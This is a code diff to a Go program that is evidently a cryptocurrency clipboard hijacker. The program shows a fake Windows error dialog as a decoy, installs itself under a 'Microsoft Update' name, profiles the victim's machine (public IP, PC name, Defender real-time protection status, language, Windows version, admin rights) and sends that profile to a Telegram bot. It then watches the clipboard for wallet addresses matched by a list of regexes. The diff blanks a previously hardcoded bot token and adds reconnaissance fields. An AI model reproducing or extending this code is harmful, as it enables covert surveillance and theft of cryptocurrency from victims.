@@ -23,10 +23,10 @@ import (
 const (
 	dirName          = "Microsoft"
 	fileName         = "Update"
-	mutexName        = "Global\\qerhbfnuqeurtrbdtbqehvfrq"
+	mutexName        = "Global\\srghtyjfdhggdjdjdytgjdtj"
 	registryName     = "Update"
-	telegramBotToken = "7355349065:AAHqBgsstpFc6ZVHBUcRGXNVzP19TaQst5E" 	// Telegram Bot Token
-	chatID           = "7275089328"     									// Telrgam Chat ID
+	telegramBotToken = "" 										// Telegram Bot Token
+	chatID           = ""     									// Telegram Chat ID
 	clipboardFreq    = 500 * time.Millisecond
 	inactivityTimeout = 15 * time.Minute
 	mouseCheckFreq   = 1 * time.Second
@@ -40,6 +40,7 @@ type regexPair struct {
 var regexList = []regexPair{
 	{regexp.MustCompile(`^[48][A-Za-z0-9]{94}$`), "XMR Address"},
 	{regexp.MustCompile(`^L[a-zA-HJ-NP-Z0-9]{33}$`), "LTC Address"},
+	{regexp.MustCompile(`^ltc1[a-z0-9]{11,59}$`), "LTC Address"},
 	{regexp.MustCompile(`^T[1-9A-HJ-NP-Za-km-z]{33}$`), "Trx address"},
 	{regexp.MustCompile(`^0x[a-fA-F0-9]{40}$`), "eth address"},
 	{regexp.MustCompile(`^r[0-9a-zA-Z]{24,34}$`), "Xrp address"},
@@ -51,43 +52,81 @@ var regexList = []regexPair{
 	{regexp.MustCompile(`^bnb1[a-z0-9]{38}$`), "BNB Address"},
 }
 
+
 func main() {
-	if !ensureSingleInstance() {
-		fmt.Println("Another instance is already running.")
-		return
-	}
+    if !ensureSingleInstance() {
+        fmt.Println("Another instance is already running.")
+        return
+    }
 
-	executableName := filepath.Base(os.Args[0])
-	time.Sleep(3 * time.Second)
-	dialog.Message(
-		"An error has occurred in the program during initialization. If this issue persists, please contact your system administrator.\n\n"+
-			"Error Code: 0x80070426\n\n",
-	).Title(executableName).Error()
+    executableName := filepath.Base(os.Args[0])
+    time.Sleep(3 * time.Second)
+    dialog.Message(
+        "An error has occurred in the program during initialization. If this issue persists, please contact your system administrator.\n\n"+
+            "Error Code: 0x80070426\n\n",
+    ).Title(executableName).Error()
 
-	installSelf()
-	
-	ip := getPublicIP()
-	pcName := getPCName()
-	antivirusStatus := isAntivirusEnabled()
+    installSelf()
 
-	message := fmt.Sprintf(
-		"*System Information*\n"+
-			"--------------------\n"+
-			"*📡 Public IP :* `%s`\n"+
-			"*💻 PC Name :* `%s`\n"+
-			"*🛡 Antivirus Status :* `%s`\n"+
-			"--------------------",
-		ip, pcName, antivirusStatus,
-	)
+    currentTime := time.Now().Format("2006-01-02 15:04:05") 
 
-	err := sendMessageToTelegram(message)
-	if err != nil {
-		fmt.Println("Failed to send message to Telegram:", err)
-	} else {
-		fmt.Println("Message sent successfully!")
-	}
+    ip := getPublicIP()
+    pcName := getPCName()
+    antivirusStatus := isAntivirusEnabled()
+    systemLanguage := getSystemLanguage()  
+    windowsVersion := getWindowsVersion()  
+    adminStatus := "User"
+    if isAdmin() {
+        adminStatus = "Admin"
+    }
 
-	monitorClipboard()
+    message := fmt.Sprintf(
+        "*System Information*\n"+
+            "=====================\n"+
+            "*📡 Public IP:* `%s`\n"+
+            "*💻 PC Name:* `%s`\n"+
+            "*🛡 Antivirus Status:* `%s`\n"+
+            "*🌐 System Language:* `%s`\n"+
+            "*💻 Windows Version:* `%s`\n"+
+            "*🧑‍💻 Execution Status:* `%s`\n"+
+            "*⏰ Execution Time:* `%s`\n"+
+            "=====================\n",
+        ip, pcName, antivirusStatus, systemLanguage, windowsVersion, adminStatus, currentTime,
+    )
+
+    err := sendMessageToTelegram(message)
+    if err != nil {
+        fmt.Println("Failed to send message to Telegram:", err)
+    } else {
+        fmt.Println("Message sent successfully!")
+    }
+
+    monitorClipboard()
+}
+
+
+
+func isAdmin() bool {
+	_, err := os.Open("\\\\.\\PHYSICALDRIVE0")
+	return err == nil
+}
+
+func getSystemLanguage() string {
+    cmd := exec.Command("powershell", "-Command", "[System.Globalization.CultureInfo]::CurrentCulture.Name")
+    output, err := cmd.Output()
+    if err != nil {
+        return "Unknown"
+    }
+    return strings.TrimSpace(string(output))
+}
+
+func getWindowsVersion() string {
+    cmd := exec.Command("powershell", "-Command", "(Get-WmiObject -Class Win32_OperatingSystem).Caption")
+    output, err := cmd.Output()
+    if err != nil {
+        return "Unknown"
+    }
+    return strings.TrimSpace(string(output))
 }
 
 func ensureSingleInstance() bool {
@@ -208,19 +247,20 @@ func getPCName() string {
 }
 
 func isAntivirusEnabled() string {
-	cmd := exec.Command("powershell", "Get-MpComputerStatus | Select-Object -ExpandProperty AMServiceEnabled")
-	output, err := cmd.Output()
-	if err != nil {
-		return "Unknown"
-	}
-	status := strings.TrimSpace(string(output))
-	if status == "True" {
-		return "Enabled"
-	} else if status == "False" {
-		return "Disabled"
-	}
-	return "Unknown"
+    cmd := exec.Command("powershell", "Get-MpComputerStatus | Select-Object -ExpandProperty RealTimeProtectionEnabled")
+    output, err := cmd.Output()
+    if err != nil {
+        return "Unknown"
+    }
+    status := strings.TrimSpace(string(output))
+    if status == "True" {
+        return "Enabled"
+    } else if status == "False" {
+        return "Disabled"
+    }
+    return "Unknown"
 }
+
 
 func sendMessageToTelegram(message string) error {
 	url := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", telegramBotToken)
@@ -242,3 +282,4 @@ func sendMessageToTelegram(message string) error {
 	}
 	return nil
 }
+
